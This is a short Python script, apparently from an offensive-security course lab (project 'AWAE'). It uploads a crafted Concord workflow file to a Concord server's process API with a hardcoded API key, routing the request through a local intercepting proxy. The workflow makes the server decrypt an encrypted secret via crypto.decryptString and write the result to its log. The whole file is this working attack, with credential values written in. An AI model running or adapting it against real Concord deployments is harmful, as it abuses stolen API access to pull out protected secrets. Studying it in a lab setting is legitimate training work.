import requests

key = "vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf"

yml = f"""
flows:
  default:
  - log: \"Hello, ${{crypto.decryptString('{key}')}}\"
"""

print(yml)

api_key = "auBy4eDWrKWsyhiDp3AQiw"
s = requests.Session()

proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080'
}
s.proxies.update(proxies)

target = "http://concord:8001/api/v1/process"
headers = {
  'Authorization': api_key,
}

files = {
  'concord.yml': ("concord.yml", yml, 'application/yml')
}

data = {
	"orgId": "a33f418a-a474-11eb-a57c-0242ac120003",
	"project": "AWAE"
}

r = s.post(target, headers=headers, files=files, data=data)

print(r.text)